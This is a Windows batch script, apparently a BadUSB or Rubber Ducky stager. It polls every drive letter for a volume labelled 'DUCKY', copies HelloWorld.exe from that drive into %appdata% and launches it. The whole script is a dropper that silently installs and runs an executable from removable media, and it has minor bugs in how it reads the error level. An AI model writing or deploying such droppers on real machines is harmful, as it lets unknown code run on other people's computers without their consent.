@echo off
:wait
echo hello
setLocal EnableDelayedExpansion
set usbname=DUCKY
for %%z in (A: B: C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) do ( 
	echo %%z
	for /f "tokens=8" %%g in ('vol %%z ^| findstr "DUCKY"') do ( 
		echo %volid%
		echo/%usbname%|find "%%g" >nul
			if %errorlevel% == 0 (
			echo yes %%z
			echo copy truc to %%z
			copy %%z\HelloWorld.exe %appdata%
			cd %appdata% && start HelloWorld.exe 
			exit 
			) else (
			echo no
			)
	)		
)
timeout /t 2
goto :wait
exit 
